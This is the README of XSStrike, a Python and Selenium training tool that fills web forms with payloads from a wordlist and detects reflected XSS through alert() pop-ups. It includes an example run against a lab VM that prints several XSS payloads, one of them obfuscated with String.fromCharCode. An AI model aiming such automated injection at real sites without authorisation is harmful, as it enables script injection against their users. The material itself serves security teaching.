# XSStrike

A **reflected XSS Tester for interactive forms** - The program automates testing for reflected XSS vulnerabilities by injecting various XSS payloads into a web application, automatically filling and submitting forms, and verifying whether the attack was successful by detecting alert() pop-ups or reflected code in the webpage.  

The program was created as part of my training at the Developer Academy and is used exclusively for teaching purposes.  

## Table of Contents

1. [Technologies](#technologies)
1. [Getting Started](#getting-started)
1. [Usage](#usage)
   * [Program Options](#program-options)
   * [Program FLow](#program-flow)
   * [Example Run](#example-run)

## Technologies

* **Python** 3.12.2
  * **argparse, time**
  * **Selenium** [More Information](https://selenium-python.readthedocs.io/)
    * In Python, it is a library (open-source) that allows developers to automate web applications by writing a script that performs certain actions in a web browser as if it were controlled by a human user.
    * To use it, a **WebDriver** must be installed for the respective browser, in this case:
      * **GeckoDriver for Firefox browser** v0.35.0 [More Information](https://github.com/mozilla/geckodriver)

## Getting Started

0) [Fork](https://docs.github.com/de/pull-requests/collaborating-with-pull-requests/working-with-forks/fork-a-repo) the project to your namespace, if you want to make changes or open a [Pull Request](https://docs.github.com/de/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/about-pull-requests).

1. [Clone](https://docs.github.com/en/repositories/creating-and-managing-repositories/cloning-a-repository) the project to your platform if you just want to use it:

    ```bash
    git clone git@github.com:SarahZimmermann-Schmutzler/XSStrike.git
    ```

1. Install the **dependencies**:
   * Create a **Virtual Environment (Venv)** in the project folder:

      ```bash
      python -m venv env
      ```

   * **Activate** the Venv:

      ```bash
      source venv/bin/activate #Linux
      env\Scripts\activate #Windows
      ```

   * Install the **dependencies** from [requirements.txt](./requirements.txt):

      ```bash
      pip install -r requirements.txt
      ```

1. Install the **GeckoDriver** for the Firefox browser:
     * [Download v0.35.0 from GitHub](https://github.com/mozilla/geckodriver/releases) and follow the instrcutions given there.

## Usage

* For the further commands navigate to the directory you cloned **XSStrike** into.

### Program Options

* To see all available **program options** have a look in the `help-section`:

    ```bash
    python xsstrike.py -h
    # or
    python xsstrike.py --help
    ```

  | Option (Long) | Short | Description | Required? |
  | ------------- | ----- | ----------- | --------- |
  | --help | -h | Get a list of the **available options** | no |
  | --url | -u | **URL** of the page containing the input form | yes |
  | --level | -l | **Level** to be entered in the form | yes |
  | --level_field | -l_f | Name of the **input field for the level** | yes |
  | --payload_field | -p_f | Name of the **input field for the payload** | yes |
  | --button | -b | Class_Name of the **submit button** | yes |
  | --wordlist | -w | Path to the **file** containing XSS payloads | yes |
  | --sink | -s | CSS selector of the **element** where the reflection should be checked | no |
  | --headless |  | Runs the browser in **headless mode** | no |

### Program Flow

* **Loads the XSS payloads** from the specified wordlist.
* Creates and configures the **WebDriver options** for Firefox.
* **Tests the XSS payloads** one after another:
  * Starts a new WebDriver instance for each payload.
  * Finds the defined input fields and the submit button on the page.
  * Injects the respective XSS payload and submits the form.
  * Checks for a JavaScript execution (alert()) to confirm an XSS vulnerability.
  * If --sink is specified, it verifies if the payload appears in the HTML.
  * If XSS is detected, the test stops, otherwise, the next payload is tested.

### Example Run

* To automatically complete the fourth level of the `Insta XSS Challenges` from the Developer Akademie's XSS VM use the following command:

  ```bash
  python xsstrike.py -u "http://10.0.2.6/index.php" \
    -l "admin4"  \
    -l_f "user" \
    -p_f "password" \
    -b "login-btn" \
    -w "payload.txt"
  ```

* It will yield the following **output**:

  ```bash
  [*] Loaded 6 payloads.
  [*] Testing Payload: x" onerror="alert('Gehackt!')
  [-] No XSS detected.
  [*] Testing Payload: alert('Gehackt!')
  [-] No XSS detected.
  [*] Testing Payload: String.fromCharCode(97,108,101,114,116,40,39,71,101,104,97,99,107,116,33,39,41)
  [!] XSS detected with payload: String.fromCharCode(97,108,101,114,116,40,39,71,101,104,97,99,107,116,33,39,41)
  ```
